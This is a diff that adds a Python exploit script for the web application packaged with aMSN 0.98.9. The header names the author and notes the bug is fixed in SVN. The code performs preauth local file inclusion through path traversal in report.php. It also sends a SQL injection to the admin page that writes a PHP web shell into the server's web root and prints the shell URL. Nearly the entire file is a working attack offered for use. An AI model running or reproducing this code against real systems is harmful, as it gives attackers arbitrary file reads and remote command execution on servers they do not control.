@@ -1,0 +1,59 @@
+# Exploit Title: aMSN LFI/SQLi
+# Date: 10/09/2013
+# Exploit author: drone (@dronesec)
+# Vendor homepage: http://www.amsn-project.net
+# Software link: sourceforge.net/projects/amsn/files/amsn/0.98.9/aMSN-0.98.9-tcl85-windows-installer.exe
+# Version: 0.98.9
+# Fixed in: SVN repositories (r12422)
+# Tested on: Ubuntu 12.04 (apparmor disabled)
+
+from argparse import ArgumentParser
+import urllib2
+import string
+import random
+
+"""
+    Preauth LFI and SQLi in the web app packaged with aMSN 0.98.9
+"""
+
+def lfi(options):
+    """ exploit the LFI
+    """
+    addr = 'http://{0}{1}/bugs/report.php?lang=../../../../../{2}'.format(\
+                            options.ip, options.root, options.lfi)
+    data = urllib2.urlopen(addr).read().rstrip().split("ERROR")[0]
+    print data
+
+def run(options):
+    """ exploit lfi or sqli
+    """
+    if options.lfi:
+        return lfi(options)
+
+    shell = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(5))
+    sqli = 'http://{0}{1}/bugs/admin/index.php?show=bug&id='.format(options.ip, options.root)
+
+    # ' UNION SELECT '<?php system($_GET['cmd']) ?>,2,3,4,5,6,7,8,9 INTO OUTFILE 'yourshell';-- -
+    exploit = '1\'%20UNION%20SELECT%20\'<?php%20system($_GET[\\\'cmd\\\'])?>\',2,3,4,5,6,7,8,9%20'\
+              'INTO%20OUTFILE%20\'{0}/{1}.php\';%20--%20-%20'.format(options.path,shell)
+
+    urllib2.urlopen(sqli + exploit)
+    print '[!] Shell dropped.  http://%s%s/%s.php?cmd=ls' % (options.ip, options.root, shell)
+
+def parse_args():
+    parser = ArgumentParser()
+    parser.add_argument("-i", help='Server address', action='store', dest='ip', required=True)
+    parser.add_argument('-l', help='Local file inclusion', action='store', dest='lfi',
+                              metavar='[file]')
+    parser.add_argument('-p', help='Path to amsn [/amsn]', action='store', dest='root',
+                              default='/amsn')
+    parser.add_argument('-w', help='Path to drop shell [/var/www/amsn', dest='path',
+                              default='/var/www/amsn')
+
+    options = parser.parse_args()
+    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+    options.root = options.root if options.root[-1] != '/' else options.root[:-1]
+    return options
+
+if __name__ == "__main__":
+    run(parse_args())
